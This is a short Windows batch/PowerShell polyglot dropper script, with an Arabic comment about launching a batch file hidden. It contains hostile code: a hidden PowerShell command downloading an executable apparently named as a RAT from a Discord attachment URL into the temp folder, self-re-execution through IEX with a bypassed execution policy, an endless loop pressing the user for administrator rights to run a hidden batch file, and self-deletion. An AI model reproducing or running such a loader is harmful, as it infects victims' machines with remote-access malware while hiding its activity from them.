<# :batch script
@echo off
#PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1099297453687193600/1136808172644995122/rat-scan_v_beta.exe','%TEMP%\UploadThisFile.exe')
setlocal
#انشاء ملف بات بأمر لتشغيل ملف البات التالي مخفي
echo start /min cmd /c "%temp%\BatchByload.bat" >> %Temp%\BatchByloadStartHid.bat
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
del %0
exit
goto:eof
#>
while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k %TEMP%\BatchByloadStartHid.bat /';exit}catch{}}
del %0